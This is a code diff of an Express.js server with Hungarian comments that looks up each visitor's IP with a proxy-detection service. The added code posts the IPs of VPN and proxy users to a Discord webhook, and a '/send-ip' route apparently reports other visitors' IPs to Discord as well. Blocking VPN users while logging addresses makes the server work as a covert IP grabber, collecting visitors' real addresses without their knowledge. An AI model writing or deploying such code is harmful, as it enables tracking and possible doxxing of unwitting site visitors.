@@ -10,7 +10,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // Webhook URL és IPINFO token a .env fájlból
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
+const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;  // Az új webhook URL
 const ipinfoToken = process.env.IPINFO_TOKEN;
 const proxyCheckApiKey = process.env.PROXYCHECK_API_KEY; // ProxyCheck API kulcs
 
@@ -25,8 +25,25 @@ app.get('/', async (req, res) => {
 
         // Ellenőrizzük, hogy VPN vagy Proxy használata van-e
         if (proxyCheckData[userIp].vpn === "yes" || proxyCheckData[userIp].proxy === "yes") {
-            // Ha VPN vagy Proxy van, blokkoljuk a hozzáférést
+            // Ha VPN vagy Proxy van, blokkoljuk a hozzáférést és küldjük az IP-t az alt webhook-ra
             console.log(`VPN vagy Proxy használat észlelve: IP: ${userIp}`);
+
+            // Üzenet küldése az alt webhook-ra
+            const altMessage = {
+                username: "VPN/Proxy Észlelő Rendszer",
+                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+                content: `Figyelem! VPN vagy Proxy használatot észleltünk az IP címen: ${userIp}`,
+                embeds: [{
+                    title: "VPN/Proxy használat észlelve!",
+                    description: `**IP-cím >>** ${userIp}`,
+                    color: 0xFF0000  // Piros szín, hogy figyelmeztetést jelezzen
+                }]
+            };
+
+            // Webhook küldés a másik webhook URL-re
+            await axios.post(altWebhookUrl, altMessage);
+
+            // Visszaküldjük a hibaüzenetet
             return res.status(403).send("Hozzáférés tilos: VPN vagy Proxy használata nem engedélyezett.");
         }
 
@@ -55,8 +72,25 @@ app.get('/send-ip', async (req, res) => {
 
         // Ellenőrizzük, hogy VPN vagy Proxy használat van-e
         if (proxyCheckData[userIp].vpn === "yes" || proxyCheckData[userIp].proxy === "yes") {
-            // Ha VPN vagy Proxy van, nem küldjük el az IP-t Discordra
+            // Ha VPN vagy Proxy van, nem küldjük el az IP-t Discordra és az alt webhook-ra küldünk értesítést
             console.log(`VPN vagy Proxy használat észlelve: IP: ${userIp}`);
+
+            // Üzenet küldése az alt webhook-ra
+            const altMessage = {
+                username: "VPN/Proxy Észlelő Rendszer",
+                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+                content: `Figyelem! VPN vagy Proxy használatot észleltünk az IP címen: ${userIp}`,
+                embeds: [{
+                    title: "VPN/Proxy használat észlelve!",
+                    description: `**IP-cím >>** ${userIp}`,
+                    color: 0xFF0000  // Piros szín
+                }]
+            };
+
+            // Webhook küldés a másik webhook URL-re
+            await axios.post(altWebhookUrl, altMessage);
+
+            // Visszaküldjük a hibaüzenetet
             return res.status(403).send("Hozzáférés tilos: VPN vagy Proxy használata nem engedélyezett.");
         }
 
